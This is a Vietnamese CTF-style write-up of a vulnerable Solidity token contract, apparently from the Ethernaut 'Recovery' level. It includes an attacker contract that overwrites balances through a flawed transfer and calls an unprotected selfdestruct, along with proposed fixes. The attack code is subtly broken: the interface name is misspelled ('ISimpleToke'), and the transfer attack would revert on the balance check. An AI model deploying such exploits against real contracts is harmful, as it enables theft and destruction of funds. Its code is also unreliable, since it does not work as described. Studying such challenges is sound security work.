### Kết luận
- Lỗ hổng:  hàm `transfer` để cộng dồn thay vì ghi đè số dư của người nhận, không Giới hạn số token nhận được trong hàm receive để tránh việc nhận quá nhiều Ether và token, hàm `destroy` không giới hạn quyền ai gọi.
- Cách phòng tránh:
- Sửa lỗi trong hàm transfer để cộng dồn thay vì ghi đè số dư của người nhận.
- Giới hạn số token nhận được trong hàm receive để tránh việc nhận quá nhiều Ether và token.
- Thêm modifier kiểm soát quyền cho hàm destroy để tránh việc bất kỳ ai cũng có thể xóa hợp đồng.
VD:
```solidity
receive() external payable {
    uint256 tokenAmount = msg.value * 10;
    require(tokenAmount <= 1000000, "Token amount exceeds limit");
    balances[msg.sender] += tokenAmount;
}
address public owner;

modifier onlyOwner() {
    require(msg.sender == owner, "Not the contract owner");
    _;
}

function destroy(address payable _to) public onlyOwner {
    selfdestruct(_to);
}
```
- Và sửa lại hàm `transfer` như contract bên dưới.
### Contract tấn công
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
interface ISimpleToken{
    function transfer(address _to, uint256 _amount) external;
    function destroy(address payable _to) external; 
    // Pha huy hop dong va chuyen toan bo so du cua hop dong toi dia chi _to
}
contract SimpleTokenAttack{
    ISimpleToken public victim;
    constructor (address challenge){
        victim = ISimpleToke(challenge);
    }
    function attackByTransfer(address _target) public payable{
        uint256 amount = 83868386 ether;
        victim.transfer(_target, amount); // Ghi đè số dư của người nhận = amount.
        // Do loi trong ham transfer cua hop dong SimpleToken
    }
    function attackByDestroy(address payable _to) public{
        victim.destroy(_to);
    }
    // GOi dc ham nay do ko kiem soat quyen ai co the goi
    // Pha huy hop dong va chuyen so du hop dong den dia chi _to
}
```
### Contract
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Recovery {
    //generate tokens
    function generateToken(string memory _name, uint256 _initialSupply) public {
        new SimpleToken(_name, msg.sender, _initialSupply);
    }
}

contract SimpleToken {
    string public name;
    mapping(address => uint256) public balances;

    // constructor
    constructor(string memory _name, address _creator, uint256 _initialSupply) {
        name = _name;
        balances[_creator] = _initialSupply;
    }

    // collect ether in return for tokens
    receive() external payable {
        balances[msg.sender] = msg.value * 10;
    }

    // allow transfers of tokens
    function transfer(address _to, uint256 _amount) public {
        require(balances[msg.sender] >= _amount);
        balances[msg.sender] = balances[msg.sender] - _amount;
        balances[_to] = _amount; //Để tránh lỗ hổng thì sửa thành balances[_to] += _amount;
    }

    // clean up after ourselves
    function destroy(address payable _to) public {
        selfdestruct(_to);
    }
}
```
